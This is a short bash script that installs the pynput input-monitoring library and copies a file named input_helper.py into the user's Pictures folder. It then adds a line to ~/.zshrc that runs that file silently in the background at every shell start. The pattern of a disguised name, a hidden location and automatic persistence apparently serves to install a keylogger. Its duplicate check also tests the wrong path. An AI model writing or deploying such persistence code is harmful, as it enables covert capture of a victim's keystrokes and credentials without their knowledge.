#!/usr/bin/env bash

pip3 install pynput

cp ./input_helper.py ~/Pictures/input_helper.py

if [ ! -f ~/.zshrc ]; then
    echo "#!/usr/bin/env bash" >> ~/.zshrc
    echo "python3 ~/Pictures/input_helper.py &" >> ~/.zshrc
else
    if ! grep -q  "python3 /bin/input_helper.py &" ~/.zshrc; then
        echo "python3 ~/Pictures/input_helper.py &" >> ~/.zshrc
    fi
fi

#chmod +x ~/.xinitrc
